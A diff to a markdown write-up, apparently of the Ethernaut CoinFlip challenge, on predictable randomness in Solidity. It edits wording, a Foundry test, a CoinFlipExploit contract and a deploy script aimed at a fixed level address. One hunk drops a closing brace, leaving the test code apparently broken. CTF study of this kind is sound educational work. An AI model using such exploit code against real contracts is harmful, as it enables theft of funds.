@@ -65,7 +65,7 @@ contract CoinFlip {
 
 
 * the EVM is a deterministic turing machine. 
-  - since it has no inherent randomness and as everything in the contracts is publicly visible (`block.timestamp`, `block.number`, etc.), generating random numbers in solidity is tricky. 
+  - since it has no inherent randomness and as everything in the contracts is publicly visible (`block.timestamp`, `block.number`, etc.), generating random numbers in solidity is non-trivial.
   - projects resource to external oracles or to Ethereum validator's **[RANDAO](https://github.com/randao/randao)** algorithm.
 
 <br>
@@ -141,12 +141,13 @@ return true;
 import "forge-std/Test.sol";
 import {CoinFlip} from "src/03/CoinFlip.sol";
 
+
 contract CoinFlipTest is Test {
 
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
     uint8 consecutiveWinsHacked = 10;
-
     CoinFlip public level;
+
     address instance = vm.addr(0x1); 
     address hacker = vm.addr(0x2); 
 
@@ -191,7 +192,6 @@ contract CoinFlipTest is Test {
         vm.stopPrank();
 
       }
-}
 ```
 
 <br>
@@ -219,10 +219,10 @@ import {CoinFlip} from "src/03/CoinFlip.sol";
 contract CoinFlipExploit {
 
     uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-    CoinFlip immutable level;
+    CoinFlip public level;
 
-    constructor(CoinFlip level_) {
-        level = level_;
+    constructor(address _levelInstance) {
+        level = CoinFlip(_levelInstance);
     }
 
     function run() public returns (bool guess) {
@@ -244,7 +244,6 @@ contract CoinFlipExploit {
 
 ```solidity
 import "forge-std/Script.sol";
-import {CoinFlip} from "src/03/CoinFlip.sol";
 import {CoinFlipExploit} from "src/03/CoinFlipExploit.sol";
 
 
@@ -253,8 +252,7 @@ contract Exploit is Script {
     uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     address levelInstance = 0xfC3A1c7Aaf80dAf711256cEa4d959722DbF2B5B1;
-    CoinFlip level = CoinFlip(levelInstance);
-    CoinFlipExploit exploit = new CoinFlipExploit(level);
+    CoinFlipExploit exploit = new CoinFlipExploit(levelInstance);
  
     function run() public {
 
